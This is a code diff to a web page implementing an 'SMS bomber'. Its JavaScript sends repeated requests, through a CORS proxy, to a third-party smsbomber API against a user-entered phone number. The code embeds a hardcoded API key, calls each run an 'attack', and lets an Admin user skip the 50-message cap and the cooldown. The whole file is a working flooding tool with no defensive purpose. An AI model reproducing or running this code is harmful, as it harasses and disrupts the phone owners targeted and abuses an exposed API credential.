@@ -301,85 +301,86 @@
     }
 
     function startSimulation() {
-      let number = document.getElementById("number").value.trim();
-      const count = parseInt(document.getElementById("count").value.trim());
-      const delay = parseFloat(document.getElementById("delay").value.trim()) || 1.5;
-      const logBox = document.getElementById("logBox");
-      const timerDisplay = document.getElementById("timerDisplay");
+  let number = document.getElementById("number").value.trim();
+  const count = parseInt(document.getElementById("count").value.trim());
+  const delay = parseFloat(document.getElementById("delay").value.trim()) || 1.5;
+  const logBox = document.getElementById("logBox");
+  const timerDisplay = document.getElementById("timerDisplay");
 
-      if (number.length === 10 && number.startsWith("9")) {
-        number = "0" + number;
-        document.getElementById("number").value = number;
-      }
+  if (number.length === 10 && number.startsWith("9")) {
+    number = "0" + number;
+    document.getElementById("number").value = number;
+  }
 
-      if (!/^09\d{9}$/.test(number) || isNaN(count) || count <= 0 || isNaN(delay)) {
-        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Invalid phone number, count, or delay.</div>";
-        return;
-      }
+  if (!/^09\d{9}$/.test(number) || isNaN(count) || count <= 0 || isNaN(delay)) {
+    logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Invalid phone number, count, or delay.</div>";
+    return;
+  }
 
-      // Remove the message limit for Admin
-      if (currentUser   !== "Admin" && count > 50) {
-        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Maximum number of messages is 50.</div>";
-        return;
-      }
+  // Remove the message limit for Admin
+  if (currentUser !== "Admin" && count > 50) {
+    logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Maximum number of messages is 50.</div>";
+    return;
+  }
 
-      logBox.innerHTML = "";
-      timerDisplay.textContent = "🚀 Starting Attack...";
-      isAttacking = true;
+  logBox.innerHTML = "";
+  timerDisplay.textContent = "🚀 Starting Attack...";
+  isAttacking = true;
 
-      let completed = 0;
+  let completed = 0;
 
-      for (let i = 1; i <= count; i++) {
-        setTimeout(() => {
-          // Remove cooldown for Admin
-          if (cooldownActive && currentUser   !== "Admin") {
-            logBox.innerHTML += "<div class='log-entry' style='color: orange;'>⚠️ Cooldown active. Please wait.</div>";
-            return;
+  for (let i = 1; i <= count; i++) {
+    setTimeout(() => {
+      const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8`;
+
+      fetch(url)
+        .then(res => res.json())
+        .then(data => {
+          const result = data.message || "SMS bombing completed.";
+          const log = document.createElement("div");
+          log.className = "log-entry";
+          log.textContent = `${i.toString().padStart(2, '0')} ✅ Sent to ${number}: ${result}`;
+          logBox.appendChild(log);
+          logBox.scrollTop = logBox.scrollHeight;
+          logAction(`${currentUser} sent ${count} SMS to ${number}.`);
+
+          completed++;
+          if (completed === count) {
+            timerDisplay.textContent = "✅ Attack Finished.";
+            isAttacking = false;
+
+            // Set cooldown for non-admin users after attack is finished
+            if (currentUser !== "Admin") {
+              cooldownActive = true;
+              remainingCooldownTime = 180;
+              displayCooldownMessage();
+            }
           }
+        })
+        .catch(error => {
+          const log = document.createElement("div");
+          log.className = "log-entry";
+          log.style.color = "red";
+          log.textContent = `${i.toString().padStart(2, '0')} ❌ Error: ${error.message}`;
+          logBox.appendChild(log);
+          logBox.scrollTop = logBox.scrollHeight;
 
-          const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8`;
+          completed++;
+          if (completed === count) {
+            timerDisplay.textContent = "✅ Attack Finished.";
+            isAttacking = false;
 
-          fetch(url)
-            .then(res => res.json())
-            .then(data => {
-              const result = data.message || "SMS bombing completed.";
-              const log = document.createElement("div");
-              log.className = "log-entry";
-              log.textContent = `${i.toString().padStart(2, '0')} ✅ Sent to ${number}: ${result}`;
-              logBox.appendChild(log);
-              logBox.scrollTop = logBox.scrollHeight;
-              logAction(`${currentUser  } sent ${count} SMS to ${number}.`);
-
-              completed++;
-              if (completed === count) {
-                timerDisplay.textContent = "✅ Attack Finished.";
-                isAttacking = false;
-              }
-
-              // Set cooldown for non-admin users
-              if (currentUser   !== "Admin") {
-                cooldownActive = true;
-                remainingCooldownTime = 180;
-                displayCooldownMessage();
-              }
-            })
-            .catch(error => {
-              const log = document.createElement("div");
-              log.className = "log-entry";
-              log.style.color = "red";
-              log.textContent = `${i.toString().padStart(2, '0')} ❌ Error: ${error.message}`;
-              logBox.appendChild(log);
-              logBox.scrollTop = logBox.scrollHeight;
-
-              completed++;
-              if (completed === count) {
-                timerDisplay.textContent = "✅ Attack Finished.";
-                isAttacking = false;
-              }
-            });
-        }, i * delay * 1000);
-      }
-    }
+            // Set cooldown for non-admin users after attack is finished
+            if (currentUser !== "Admin") {
+              cooldownActive = true;
+              remainingCooldownTime = 180;
+              displayCooldownMessage();
+            }
+          }
+        });
+    }, i * delay * 1000);
+  }
+}
 
     function displayCooldownMessage() {
       const logBox = document.getElementById("logBox");
@@ -450,4 +451,3 @@
   </script>
 </body>
 </html>
-
